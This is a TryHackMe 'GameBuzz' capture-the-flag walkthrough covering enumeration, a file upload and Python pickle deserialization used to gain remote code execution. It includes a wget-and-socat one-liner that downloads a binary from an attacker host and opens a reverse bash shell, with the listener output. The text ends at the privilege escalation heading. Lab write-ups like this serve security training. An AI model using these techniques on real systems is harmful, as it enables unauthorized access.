# [GameBuzz] (https://tryhackme.com/r/room/gamebuzz)
> Author: Nayanjyoti Kumar

## Table of Content:
1. Service Enumeration
2. Initial Foothold
3. Privilege Escalation: www-data to dev2
4. Privilege Escalation: dev2 to dev1
5. Privilege Escalation: dev1 to root
6. Conclusion

## Service Enumeration:
1. As usual, scan the machine for open ports via rustscan!
> Rustscan:
![Screenshot 2024-07-17 102523](https://github.com/user-attachments/assets/5764091f-a89d-4167-80dd-480f689fbed8)

2. According to rustscan result, we have 1 port is opened:

- Open Port: 80
- Service: Apache httpd 2.4.29 ((Ubuntu))

### HTTP on Port 80:
1. Adding a new host to /etc/hosts:
> └> echo "$RHOSTS gamebuzz.thm" >> /etc/hosts

2. Home page:
![Screenshot 2024-07-17 103608](https://github.com/user-attachments/assets/42815bde-50aa-4222-80eb-96e3a2aa9e56)

3. After poking around the website, I found this is very interesting:
![Screenshot 2024-07-17 103629](https://github.com/user-attachments/assets/ee03831b-c171-4cea-8fcb-a496225ae4cc)

![Screenshot 2024-07-17 103638](https://github.com/user-attachments/assets/3aba97e2-e6f1-4e80-b32f-df63ca492ed4)
![Screenshot 2024-07-17 103650](https://github.com/user-attachments/assets/23a47ede-2f67-4d88-a5e7-f12b546ae8a5)

4. Burp Suite HTTP history:
![Screenshot 2024-07-17 103929](https://github.com/user-attachments/assets/93274ade-a887-4581-a610-5eaa49041a5d)

5. When we clicked one of those game ratings, it’ll send a POST request to /fetch, with parameter object.

6. By putting the puzzles together, the object parameter and the .pkl file extension is for Python’s pickle, which is a serialization library.

7. In the /fetch endpoint, we send file that’s pickled (serialized) object. Then, the backend deserialize our provided pickled object.

8. Hmm… If we can upload our own evil pickled object, then we might able to gain Remote Code Execution (RCE)!

9. In the bottom of the page, we found a new domain:
![Screenshot 2024-07-17 104146](https://github.com/user-attachments/assets/fd33af6e-0d9d-43aa-9642-4a8440362982)

10. Let’s replace our host in /etc/hosts to that domain!
> └> nano /etc/hosts
> 10.10.115.32 incognito.com

11. Then, we can enumerate subdomain via ffuf:
> └> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -fs 20637 -t 100
> [...]
> dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 218ms]

12. Found subdomain: dev

Then add that subdomain to /etc/hosts:
> └> nano /etc/hosts
10.10.115.32 incognito.com dev.incognito.com

13. dev:
> └> curl http://dev.incognito.com/    
<h1 style="text-align: center;">Only for Developers</h1>
Hmm… Developers only.

14. Let’s check out the robots.txt crawler file:
> └> curl http://dev.incognito.com/robots.txt
User-Agent: *
Disallow: /secret

15. Found hidden directory: /secret
![Screenshot 2024-07-17 105501](https://github.com/user-attachments/assets/32e83494-b96c-44ce-b2db-bb740a2acc17)
Hmm… HTTP staus 403 Forbidden.

16. Now, we can still enumerate hidden directory:
> └> gobuster dir -u http://dev.incognito.com/secret/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/upload               (Status: 301) [Size: 330] [--> http://dev.incognito.com/secret/upload/]

17. Found hidden directory in /secret/: /upload/
![Screenshot 2024-07-17 105625](https://github.com/user-attachments/assets/a00b9b5e-66a0-4663-87ab-c5f59dfd952e)

- View source page:
![Screenshot 2024-07-17 105658](https://github.com/user-attachments/assets/106a5a42-0584-4652-82fb-a2984b07cb8c)

When we clicked the “Start Upload” button, it’ll send a POST request to /secret/upload/script.php, with parameter the_file.

## Initial Foothold: 
1. Armed with above information, we can upload our own evil pickled object to the server, then deserialize the pickled object in /fetch.

2. But first, let’s upload a test file:
> └> echo -n 'testing' > test.txt
![Screenshot 2024-07-17 110009](https://github.com/user-attachments/assets/06bebab7-8962-4cd0-acaf-2013fa4670ec)

We successfully uploaded a file. But where does the file lives??
However, I couldn’t find the uploaded file.
Maybe we can upload our file to a specific path via path traversal?

3. To do so, I’ll write a Python script to upload and trigger the deserialization payload:
![Screenshot 2024-07-17 110206](https://github.com/user-attachments/assets/7bc915c4-a45e-4a54-b25a-d99f1620416d)

> └> nc -lnvp 443
listening on [any] 443 ...

![Screenshot 2024-07-17 110408](https://github.com/user-attachments/assets/cca1c5b2-9a29-449c-985d-3e9baf40bcb6)
Nope. The path traversal doesn’t work.

4. After some trial and error, I found that the uploaded file is in /var/upload/<filename>:
![Screenshot 2024-07-17 110504](https://github.com/user-attachments/assets/14325504-6a70-47f7-90ce-f8d36a614cf9)

> └> python3 upload_file.py
[*] Upload file request:
The file evilObject.pkl has been uploaded.

![Screenshot 2024-07-17 110612](https://github.com/user-attachments/assets/9f0a436c-818b-4f6c-874e-8eeb38bdd09b)

This time it worked!!
I’m user www-data!

5. user.txt:www-data@incognito:/$ cat /home/dev2/user.txt
> d14def35ed0bd914c1c5881fa0fa8090

6. Stable shell via socat:
![Screenshot 2024-07-17 110850](https://github.com/user-attachments/assets/412b9fa7-995f-4529-8026-3f7c18b3c3c9)

> www-data@incognito:/$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

> └> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444                

> 2023/01/24 13:20:40 socat[74118] N opening character device "/dev/pts/1" for reading and writing

> 2023/01/24 13:20:40 socat[74118] N listening on AF=2 0.0.0.0:4444

> 2023/01/24 13:21:16 socat[74118] N accepting connection from AF=2 10.10.115.32:54844 on AF=2 10.9.0.253:4444

> 2023/01/24 13:21:16 socat[74118] N starting data transfer loop with FDs [5,5] and [7,7]

> www-data@incognito:/$ 

> www-data@incognito:/$ export TERM=xterm-256color

> www-data@incognito:/$ stty rows 22 columns 107

> www-data@incognito:/$ ^C

> www-data@incognito:/$

## Privilege Escalation
### www-data to dev2
